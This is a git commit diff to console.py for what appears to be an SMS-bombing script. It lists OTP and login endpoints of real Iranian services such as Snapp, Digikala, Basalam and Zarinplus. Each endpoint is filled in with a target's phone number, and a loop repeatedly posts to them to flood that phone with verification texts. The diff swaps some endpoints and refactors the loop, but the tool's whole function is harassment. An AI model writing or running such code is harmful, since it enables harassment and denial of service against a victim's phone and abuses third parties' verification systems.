2517355d293c5db1b22f3944286731a2f4b118bf
Javari <javari@duck.com>
2024-07-23 14:40:13 +0330

    Update console.py

--- console.py
+++ console.py
@@ -34,29 +34,20 @@ try:
 
                 messageIndex = 0
                 apiServices = {
-                    "1":{"name":"snapp","url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp","data": {"cellphone":"+98"+targetNumber}},
-                    "2":{"name":"basalam","url": "https://auth.basalam.com/otp-request","data": {"mobile":"0"+targetNumber,"client_id":11}},
-                    "3":{"name":"alibaba","url": "https://ws.alibaba.ir/api/v3/account/mobile/otp","data": {"phoneNumber":targetNumber}},
-                    "4":{"name":"gapfilm","url": "https://core.gapfilm.ir/api/v3.1/Account/Login","data": {"Type":3,"Username":targetNumber,"SourceChannel":"GF_WebSite","SourcePlatform":"desktop","SourcePlatformAgentType":"Firefox","SourcePlatformVersion":"107.0","GiftCode":""}},
-                    "5":{"name":"snapp market","url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+targetNumber,"data": {}},
-                    "6":{"name":"tebinja","url": "https://www.tebinja.com/api/v1/users","data": {"username":"0"+targetNumber}},
-                    "7":{"name":"zarinplus","url": "https://api.zarinplus.com/user/zarinpal-login","data": {"phone_number":"98"+targetNumber,"source":"zarinplus"}},
-                    "8":{"name":"snapp express","url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=SUPERAPP_SPLITPAGE&optionalClient=SUPERAPP_SPLITPAGE&deviceType=SUPERAPP_SPLITPAGE&appVersion=5.6.6&clientVersion=da9a878a&optionalVersion=5.6.6&UDID=437b9076-0c60-49cc-89f9-7fcb2d47fa10","data": {"cellphone":"0"+targetNumber,"captcha":"","local":""}},
-                    "9":{"name":"snapp market","url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0"+targetNumber+"&platform=PWA","data": {}},
-                    "10":{"name":"drdr","url": "https://drdr.ir/api/registerEnrollment/sendDisposableCode","data": {"phoneNumber":targetNumber,"userType":"PATIENT"}},
-                    "11":{"name":"snapp food","url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=dc095b05-202c-4a71-9e9b-9127688fc54e&locale=fa","data": {"cellphone":"0"+targetNumber}},
-                    "12":{"name":"snapp doctor","url": "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/"+targetNumber+"/sms?cCode=+98","data": {}},
-                    "13":{"name":"snapp room","url": "https://napi.snapproom.com/users/self/verification-flow","data": {"username":"0"+targetNumber}},
-                    "14":{"name":"digikala","url": "https://api.digikala.com/v1/user/authenticate/","data": {"backUrl":"/","username":"0"+targetNumber,"otp_call":False}},
-                    ## "call":{"name":"komodaa","url": "https://api.komodaa.com/api/v2.6/loginRC/request","data": {"phone_number":"0"+targetNumber}},
+                    "snapp taxi":{"url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp","data": {"cellphone":"+98"+targetNumber}},
+                    "snapp market":{"url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+targetNumber,"data": {}},
+                    "snapp link":{"url": "https://api.snapp.ir/api/v1/sms/link","data": {"phone":"09"+targetNumber}},
+                    "basalam":{"url": "https://auth.basalam.com/otp-request","data": {"mobile":"0"+targetNumber,"client_id":11}},
+                    "digikala":{"url": "https://api.digikala.com/v1/user/authenticate/","data": {"backUrl":"/","username":"0"+targetNumber,"otp_call":False}},
+                    "zarinplus":{"url": "https://api.zarinplus.com/user/zarinpal-login","data": {"phone_number":"98"+targetNumber,"source":"zarinplus"}},
                 }
 
                 while (smsRepetition > messageIndex):
-                        for apiIndex in apiServices:
+                        for apiIndex, apiService in apiServices.items():
                             if (messageIndex >= smsRepetition): break
-                            apiName = apiServices[apiIndex]["name"]
-                            apiUrl = apiServices[apiIndex]["url"]
-                            apiData = apiServices[apiIndex]["data"]
+                            apiName = apiIndex
+                            apiUrl = apiService["url"]
+                            apiData = apiService["data"]
                             sendMessage = requests.post(apiUrl,data=apiData)
                             print(console.status("#")+"Send SMS +1 ("+str(messageIndex+1)+"/"+str(smsRepetition)+") ("+apiName+") "+console.header+sendMessage.reason+console.endc)
                             if (sendMessage.reason == "OK"): messageIndex+=1
